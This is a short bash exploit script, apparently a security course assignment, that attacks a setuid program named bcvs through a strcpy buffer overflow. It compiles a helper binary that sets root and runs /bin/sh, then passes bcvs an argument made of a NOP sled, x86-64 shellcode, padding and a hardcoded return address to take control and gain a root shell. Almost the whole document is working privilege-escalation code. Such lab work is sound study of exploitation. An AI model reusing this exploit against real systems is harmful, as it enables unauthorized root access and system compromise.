#!/bin/bash

# Exploit 4
# Take advantage of bcvs using strcpy and use a buffer overflow.
# We can overflow the src buffer at bcvs.c:151 and take control of the program.

DIRNAME=sploit4
rm -rf $DIRNAME

# Create directory to work in for this exploit
mkdir $DIRNAME
cd $DIRNAME

# Create repository
mkdir .bcvs
touch .bcvs/block.list

echo "Create helper files"

# Create a fake binary that will set us as root and run /bin/sh
cat > fake.c << EOF
#include <unistd.h>
int main() {
	setuid(0);
	return execl ("/bin/sh", "sh", NULL);
}
EOF

# Compile the fake binary
echo "Compile fake.c"
gcc fake.c -o fake

# Run the executable with our buffer overflow
echo "Run bcvs"
/opt/bcvs/bcvs ci $(python2 -c 'print(b"\x90"*148+b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x56\xbf\x66\x61\x6b\x65\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x6a\x2f\x0f\x05"+"B"*40+b"\xa0\xe8\xff\xff\xff\x7f")')

# Clean up our files
echo "Clean up helper files"
cd ../
rm -rf $DIRNAME
